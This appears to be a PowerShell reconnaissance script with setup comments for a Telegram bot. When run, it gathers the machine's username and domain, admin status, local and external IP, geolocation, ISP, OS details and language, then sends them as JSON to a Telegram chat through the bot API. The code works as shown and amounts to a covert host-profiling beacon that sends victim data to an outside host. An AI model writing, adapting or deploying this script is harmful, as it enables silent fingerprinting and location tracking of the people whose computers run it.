# Create a Telegram account.
# Search for @BotFather on Telegram. Send him "/start" without quotes.
# Follow instructions, choosing a Display Name + Username.
# Record HTTP API token.
# Browse to https://api.telegram.org/bot<yourtoken>/getUpdates
# message_id = $message_FromID. This is your "thread" ID.

# Check if user is an admin.
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Grab Opearting System name, Build , & Architecture.
$OS_Name = (Get-WMIObject win32_operatingsystem).caption
$WinBuild = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ReleaseId
$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture

# Get active IP Address based on default route
$defaultRouteNic = Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Sort-Object -Property RouteMetric | Select-Object -ExpandProperty ifIndex
$ipv4 = Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $defaultRouteNic | Select-Object -ExpandProperty IPAddress

#Grab external IP from API
$externalIP = (Invoke-WebRequest api.ipify.org).Content 

# Geolocate External IP
$geo_url = "http://ip-api.com/json/"+$externalIP
$geo_info = (Invoke-WebRequest $geo_url).Content  | ConvertFrom-Json

# Grab language
$lang = (Get-WinUserLanguageList)[0].autonym

# Build a hashtable with our data.
$message = @{
	"Timestamp" = (Get-Date).DateTime
	"User" =  $env:userdomain + "\" + $env:username # Grab Domain+Username from Environment Variables
	"ExternalIP" =  $externalIP
	"isAdmin" = $isAdmin
	"LocalIP" = $ipv4
	"OSName" = $OS_Name
	"Arch" = $arch
	"OSBuild" = $WinBuild
	"Lang" = $lang
	"City" = $geo_info.city
	"Region" = $geo_info.region
	"Country" = $geo_info.country
	"ISP" = $geo_info.isp
	"AS" = $geo_info.as
}

# Telgram Bot Token
$bot_token = ""

# https://api.telegram.org/bot<bot_token>/getUpdates
# Grab the "from":{"id":<id>}
$message_FromID = ""

# Convert our Hashtable to JSON
$json_msg = $message | ConvertTo-Json 

# Submit our JSON to Telegram API
$uri = 'https://api.telegram.org/bot' + $bot_token + '/sendMessage?chat_id=' + $message_FromID + '&parse_mode=HTML&text=' + $json_msg
$r = (Invoke-WebRequest -uri  $uri -UseBasicParsing)
